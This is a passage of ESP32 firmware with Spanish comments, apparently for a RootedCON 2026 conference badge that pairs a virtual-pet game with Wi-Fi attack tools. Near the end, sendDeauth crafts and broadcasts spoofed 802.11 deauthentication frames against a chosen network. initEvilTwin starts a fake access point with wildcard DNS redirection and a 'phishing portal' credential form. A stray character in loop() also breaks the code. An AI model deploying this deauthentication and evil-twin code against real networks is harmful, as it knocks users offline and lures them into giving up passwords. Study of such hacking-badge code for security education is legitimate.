    // Si no hay red seleccionada, selecciona la primera
    if (idx == -1) {
      for (int i = 0; i < 16; ++i) {
        if (WifiDeauthTool::networks[i].ssid.length()) {
          WifiDeauthTool::selectedNetwork = WifiDeauthTool::networks[i];
          WifiDeauthTool::enabled = true;
          g_full_redraw = true;
          return;
        }
      }
    } else {
      // Si ya está seleccionada, alterna ON/OFF
      WifiDeauthTool::enabled = !WifiDeauthTool::enabled;
      g_full_redraw = true;
    }
    return;
  }
}


void handleHashToolInput() {
  if (menuPressed(BTN_EXTRA)) {
    goMiniGames();
    return;
  }
  if (menuPressed(BTN_UP) || menuPressed(BTN_DOWN) || menuPressed(BTN_LEFT) || menuPressed(BTN_RIGHT) || menuPressed(BTN_SELECT)) {
    g_hash_source = (g_hash_source + 1) % 3;
    g_full_redraw = true;
  }
}

void handleCipherToolInput() {
  if (menuPressed(BTN_EXTRA)) {
    goMiniGames();
    return;
  }
  if (menuPressed(BTN_UP) || menuPressed(BTN_DOWN) || menuPressed(BTN_LEFT) || menuPressed(BTN_RIGHT) || menuPressed(BTN_SELECT)) {
    g_cipher_source = (g_cipher_source + 1) % 3;
    g_full_redraw = true;
  }
}

void handleLogsToolInput() {
  if (menuPressed(BTN_EXTRA)) {
    goMiniGames();
    return;
  }
  if (menuPressed(BTN_SELECT)) {
    g_log_count = 0;
    saveLogs();
    g_log_offset = 0;
    g_full_redraw = true;
    return;
  }
  if ((menuPressed(BTN_DOWN) || menuPressed(BTN_RIGHT)) && (int)(g_log_offset + 6) < g_log_count) {
    ++g_log_offset;
    g_full_redraw = true;
  }
  if ((menuPressed(BTN_UP) || menuPressed(BTN_LEFT)) && g_log_offset > 0) {
    --g_log_offset;
    g_full_redraw = true;
  }
}

// ---------------------------------------------------------------------------
// Animation
// ---------------------------------------------------------------------------
void updateAnimation() {
  const uint32_t now = millis();
  if ((now - g_last_anim_ms) >= kAnimStepMs) {
    g_last_anim_ms = now;
    g_anim_toggle = !g_anim_toggle;
    if (g_view == VIEW_HOME) g_header_dirty = true;
    if (g_view == VIEW_PET) g_pet_sprite_dirty = true;
  }

  if (g_view == VIEW_WIFI && WiFi.status() == WL_CONNECTED) {
    static wl_status_t last_status = WL_IDLE_STATUS;
    if (last_status != WiFi.status()) {
      last_status = WiFi.status();
      g_wifi_status = String("OK ") + WiFi.SSID();
      g_wifi_dirty = true;
    }
  }

  if (g_view == VIEW_HOME && (now - g_last_home_bob_ms) >= kHomeBobMs) {
    g_last_home_bob_ms = now;
    g_home_bob_toggle = !g_home_bob_toggle;
    g_home_dirty_mask |= (1 << g_selected);
    g_home_dirty = true;
  }

  if (g_effect != FX_NONE && now >= g_effect_until_ms) {
    g_effect = FX_NONE;
    if (g_view == VIEW_PET) g_pet_sprite_dirty = true;
  }
}

void initPalette() {
  kEyeW = panelColor(255, 255, 255);
  kPupil = panelColor(10, 10, 15);
  kNickPurple = panelColor(208, 168, 255);

  kSkinColor[0] = panelColor(255, 210, 178);
  kSkinColor[1] = panelColor(215, 180, 140);
  kSkinColor[2] = panelColor(245, 205, 170);
  kSkinColor[3] = panelColor(240, 200, 165);

  kHairColor[0] = panelColor(220, 35, 20);
  kHairColor[1] = panelColor(38, 32, 28);
  kHairColor[2] = panelColor(75, 48, 28);
  kHairColor[3] = panelColor(60, 40, 26);

  kFeatureColor[0] = panelColor(175, 85, 18);
  kFeatureColor[1] = panelColor(38, 32, 28);
  kFeatureColor[2] = panelColor(8, 8, 8);
  kFeatureColor[3] = panelColor(50, 42, 32);

  kMouthColor[0] = panelColor(175, 85, 18);
  kMouthColor[1] = panelColor(180, 75, 75);
  kMouthColor[2] = panelColor(180, 75, 75);
  kMouthColor[3] = panelColor(180, 75, 75);

  kClothColor[0] = panelColor(48, 48, 52);
  kClothColor[1] = panelColor(40, 125, 42);
  kClothColor[2] = panelColor(55, 55, 65);
  kClothColor[3] = panelColor(168, 65, 55);
}

void setupDisplay() {
  tft.init();
  tft.setRotation(3);
  tft.fillScreen(kBg);
  initPalette();
  WiFi.mode(WIFI_OFF);
}

// ===========================================================================
void setup() {
  Serial.begin(115200);
  delay(80);

  setupHardware();
  setupDisplay();
  if (loadSavedState()) {
    applyColdBootDecay();
  }
  loadWifiConfig();
  loadLogs();

  Serial.println("pwned_rootedcon_2026_araintel");
  Serial.println("2026 ROOTEDCON ESP32");
  Serial.println("Crew virtual en español");
  Serial.println("Persistencia activada");
  Serial.println("WiFi segura via portal local");
  addLog("ARRANQUE OK");

  g_full_redraw = true;
  g_home_dirty = true;
  g_header_dirty = true;
}

void loop() {
  updateButtons();
  decayAll();
  updateAnimation();
  if      (g_view == VIEW_HOME)        handleHomeInput();
  else if (g_view == VIEW_PET)         handlePetInput();
  else if (g_view == VIEW_MINIJUEGOS)  handleMiniGamesInput();
  else if (g_view == VIEW_WIFI)        handleWifiInput();
  else if (g_view == VIEW_WIFI_SCAN)   handleWifiScanInput();
  else if (g_view == VIEW_TWIN_DETECT) handleTwinDetectInput();
  else if (g_view == VIEW_WIFI_DEAUTH) handleWifiDeauthInput();
  else if (g_view == VIEW_EVILTWIN)    { handleEvilTwinInput(); loopEvilTwin(); }
  else if (g_view == VIEW_HASH_TOOL)   handleHashToolInput();
  else if (g_view == VIEW_CIPHER_TOOL) handleCipherToolInput();
  else if (g_view == VIEW_LOGS_TOOL)   handleLogsToolInput();
d  redraw();
  if (!g_full_redraw) {
    if (g_view == VIEW_PET) updatePetView();
    else if (g_view == VIEW_HOME) updateHomeView();
    else if (g_view == VIEW_WIFI) updateWifiView();
  }
  serviceWifiPortal();
  maybeSaveState();
  delay(8);
}

void initEvilTwin() {
  eviltwin_active = true;
  g_status = "EVILTWIN portal activo";

  // Configura el AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP("EvilTwin_AP", "12345678");

  // Inicia DNS para redirigir todo
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Inicia WebServer para portal phishing
  evilServer.on("/", HTTP_GET, []() {
    evilServer.send(200, "text/html", "<html><body><h1>Captive Portal</h1><form><input placeholder='usuario'><input placeholder='clave' type='password'><button>Login</button></form></body></html>");
  });
  evilServer.begin();
}

void loopEvilTwin() {
  // Mantener DNS y WebServer activos
  dnsServer.processNextRequest();
  evilServer.handleClient();
}

void handleEvilTwinInput() {
  if (menuPressed(BTN_EXTRA)) {
    eviltwin_active = false;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    g_status = "EvilTwin detenido";
    goMiniGames();
    return;
  }
  if (menuPressed(BTN_SELECT)) {
    g_status = "Portal phishing activo";
    g_full_redraw = true;
  }
}

void drawEvilTwin() {
  tft.fillScreen(kBg);
  tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
  tft.setTextColor(kNickPurple, kBg);
  tft.drawCentreString("EVILTWIN", tft.width() / 2, 6, 2);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("Portal phishing activo", tft.width() / 2, 22, 1);
  tft.setTextColor(kWhite, kBg);
  tft.drawCentreString("SSID: EvilTwin_AP", tft.width() / 2, 50, 1);
  tft.drawCentreString("Clave: 12345678", tft.width() / 2, 66, 1);
  tft.setTextColor(kDim, kBg);
  tft.drawCentreString("EXT VOLVER", tft.width() / 2, 152, 1);
}

void sendDeauth(const uint8_t* bssid, uint8_t ch) {
    // Cambia a canal objetivo
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    // Paquete deauth estándar
    uint8_t deauthPacket[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        // Destino (broadcast)
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        // Fuente (BSSID)
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        // BSSID
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };

    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}
